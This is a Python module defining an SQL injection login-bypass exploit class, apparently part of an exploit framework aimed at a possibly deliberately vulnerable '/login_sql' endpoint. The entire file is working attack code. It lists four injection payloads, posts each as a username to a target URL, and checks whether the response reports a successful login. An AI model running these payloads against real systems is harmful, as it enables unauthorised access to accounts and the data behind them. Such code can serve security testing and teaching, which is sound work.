import requests
from .registry import Exploit, ExploitResult


class SQLiLogin(Exploit):
    id = "sqli_login"
    name = "SQL Injection - Login Bypass"
    category = "sqli"
    description = "Bypasses authentication using SQL injection"
    payloads = [
        "admin' --",
        "' OR '1'='1' --",
        "admin'/*",
        "' OR 1=1 --",
    ]
    
    def execute(self, target_url: str, payload_index: int = 0) -> ExploitResult:
        payload = self.get_payload(payload_index)
        try:
            resp = requests.post(
                f"{target_url}/login_sql",
                json={"username": payload, "password": "anything"},
            )
            data = resp.json()
            return ExploitResult(
                success=self.check_success(data),
                response=data,
                payload_used=payload,
            )
        except requests.RequestException as e:
            return ExploitResult(
                success=False,
                response={},
                payload_used=payload,
                error=str(e),
            )
    
    def check_success(self, response: dict) -> bool:
        return response.get("status") == "Login successful"
